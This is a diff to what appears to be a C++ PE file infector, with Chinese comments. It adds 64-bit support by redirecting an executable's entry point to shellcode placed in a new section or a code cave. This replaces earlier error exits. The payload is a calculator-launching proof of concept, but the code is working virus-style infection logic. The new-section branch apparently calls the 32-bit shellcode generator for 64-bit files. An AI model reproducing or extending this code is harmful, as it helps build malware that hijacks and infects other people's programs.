@@ -18,7 +18,7 @@ enum InfectType {
 };
 
 std::string GetCalcuatorShellcode32(DWORD entry_point);
-
+std::string GetCalcuatorShellcode64(DWORD entry_point);
 
 // 感染结构体，该结构体会被写入 Dos Stub
 typedef struct _InfectPadding {
@@ -121,8 +121,15 @@ public:
 			break;
 		}
 		case PE64: {
-			std::cerr << "未实现 PE64 的感染" << std::endl;
-			std::exit(EXIT_FAILURE);
+			helper.SetEntryPoint(helper.GetNewSectionRVA());
+			if (!shellcode.size()) {
+				shellcode = GetCalcuatorShellcode32(pad.old_entry_point + helper.GetImageBase());
+			}
+			// 添加新节
+			helper.AddNewSection(shellcode, pad.name);
+			break;
+			//std::cerr << "未实现 PE64 的感染" << std::endl;
+			//std::exit(EXIT_FAILURE);
 		}
 		}
 		// 写入 padding
@@ -156,8 +163,10 @@ public:
 				break;
 			}
 			case PE64: {
-				std::cerr << "不支持64位的 shellcode" << std::endl;
-				std::exit(EXIT_FAILURE);
+				shellcode = GetCalcuatorShellcode64(helper.GetEntryPointRVA() + helper.GetImageBase());
+				break;
+				//std::cerr << "不支持64位的 shellcode" << std::endl;
+				//std::exit(EXIT_FAILURE);
 			}
 			}
 		}
@@ -194,8 +203,13 @@ public:
 			break;
 		}
 		case PE64: {
-			std::cerr << "未实现 PE64 的感染" << std::endl;
-			std::exit(EXIT_FAILURE);
+			helper.SetEntryPoint(cave.start_rva + offset);
+			file.seekp(cave.start_foa + offset, std::ios::beg);
+			// 注入
+			WriteBuffer(file, shellcode.c_str(), shellcode.size());
+			break;
+			//std::cerr << "未实现 PE64 的感染" << std::endl;
+			//std::exit(EXIT_FAILURE);
 		}
 		}
 		// 写入 padding
